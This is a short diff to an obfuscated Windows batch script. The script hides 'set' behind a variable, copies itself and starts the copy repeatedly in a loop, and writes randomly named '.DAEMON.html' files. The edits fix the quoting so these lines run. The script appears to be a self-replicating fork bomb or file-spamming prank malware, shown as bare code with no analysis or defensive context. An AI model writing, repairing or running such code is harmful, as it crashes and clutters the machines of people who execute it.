@@ -1,7 +1,7 @@
 @echo off
 :r
 set "14=set "
-14BAM=copy %0 %0x3 start %0x3
+14"BAM=copy %0 %0x3 start %0x3"
 BAM
 BAM
 BAM
@@ -51,7 +51,7 @@ H
 O
 H
 O
-14l7=%random%%random%%random%%random%.DAEMON.html
+14"l7=%random%%random%%random%%random%.DAEMON.html"
 14"6=echo "
 14"fe= > l7"
 6<!DOCTYPE html>fe
